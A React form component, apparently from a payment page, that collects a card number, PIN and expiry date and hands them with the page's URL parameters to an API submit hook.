import React, { useState, useContext, useEffect } from "react";
import { user, lock, calender, loadingState } from "../assets/icons";
import CustomInput from "./input";
import qs from "query-string";
import useApi from "../API/useApi";
import { ModalContext } from "../Store/ModalProvider";
import { LanguageContext } from "../Store/LanguageProvider";

const Form = () => {
  const { toggleModal, action } = useContext(ModalContext);
  const { t } = useContext(LanguageContext);
  const { key, handleSubmit } = useApi();

  const [PAN, setPAN] = useState("");
  const [PIN, setPIN] = useState("");
  const [expDate, setexpDate] = useState("");
  const params = {
    ...qs.parse(window.location.search),
    pathname: window.location.pathname.slice(1, -1),
  };

  let isValidate = key && PAN && PIN && expDate && true;

  useEffect(() => {
    if (action && isValidate) handleSubmit({ params, PAN, PIN, expDate });
  }, [action]);

  return (
    <form className="flex items-center flex-col">
      <CustomInput
        icon={user}
        maxLength={19}
        minLength={16}
        name="pan"
        placeholder={t("PAN")}
        returndValue={(value) => setPAN(value)}
      />

      <CustomInput
        icon={lock}
        maxLength={4}
        name="password"
        type="password"
        placeholder={t("PIN")}
        name="pin"
        returndValue={(value) => setPIN(value)}
      />

      <CustomInput
        icon={calender}
        placeholder={t("Expire Date")}
        calander
        maxLength="7"
        name="date"
        returndValue={(value) => setexpDate(value)}
      />
      <button
        type="submit"
        className={`mt-2 transition duration-500 w-64 ${
          (isValidate && "bg-primary") || "bg-gray-500"
        }   h-12 rounded-lg  text-white flex items-center justify-center font-semibold
        hover:shadow-lg`}
        onClick={(e) => {
          e.preventDefault();
          toggleModal();
        }}
        disabled={!isValidate}
      >
        {(key && t("Submit")) || loadingState()}
      </button>
    </form>
  );
};

export default Form;
